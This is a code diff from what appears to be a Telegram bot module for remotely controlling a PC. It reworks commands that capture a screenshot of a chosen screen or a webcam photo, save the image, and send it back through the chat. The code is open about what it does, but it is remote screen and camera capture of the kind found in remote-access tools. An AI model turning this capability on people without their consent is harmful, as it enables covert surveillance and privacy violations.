@@ -491,9 +491,17 @@ class Commands extends AbstractModule {
         if(!isset($screens[$screenN])) return $this->send("Ошибка: экран №$screenN не существует! Укажите номер экрана из спиcка /screens");
         
         $screen = $screens[$screenN];
-                
-        $this->send("Делаю снимок экрана №$screenN ...");
-        $file = File::createTemp('screenshot', '.png');
+        
+        $msg = "Делаю снимок экрана №$screenN ...";
+        if($this->isCallback()){
+            $this->sendCallback($msg);
+        } else {
+            $this->send($msg);
+        }
+        
+        $file = File::of(app()->appModule()->getAppDownloadDir() . '/' . time() . '_screenshot_' . $screenN . '.png');
+        $file->createNewFile(); 
+  
         Debug::info('Make screenshot to ' . $file->getAbsolutePath());
         
         app()->appModule()->robot->screenshot($screen->bounds, $screen)->save($file);
@@ -529,15 +537,25 @@ class Commands extends AbstractModule {
      */
     public function __photo(int $camN = -1){
         $cameras = Webcam::getWebcams();
-        if($camN > sizeof($cameras)) return $this->send('Указана несуществующая камера. Список камер доступен по команде /cameras');
+        if(!isset($cameras[$camN])) return $this->send('Указана несуществующая камера. Список камер доступен по команде /cameras');
         $camera = $cameras[$camN];
         
-        $file = File::createTemp('shot', '.png');
-        $this->send('Делаю снимок c камеры №' . $camN . ' (' . $camera->name . ') ...');
+        $file = File::of(app()->appModule()->getAppDownloadDir() . '/' . time() . '_shot_' . $camN . '.png');
+        $file->createNewFile(); 
+        
+        $msg = 'Делаю снимок c камеры №' . $camN . ' (' . $camera->name . ') ...';
+        if($this->isCallback()){
+            $this->sendCallback($msg);
+        } 
+        else {
+            $this->send($msg);
+        }
+        
         $camera->open();
         $camera->getImage()->save($file);
         $camera->close();
-        return ['photo' => $file->getAbsolutePath()];     
+        
+        $this->sendDoc($file->getAbsolutePath());    
     }   
     
     /**
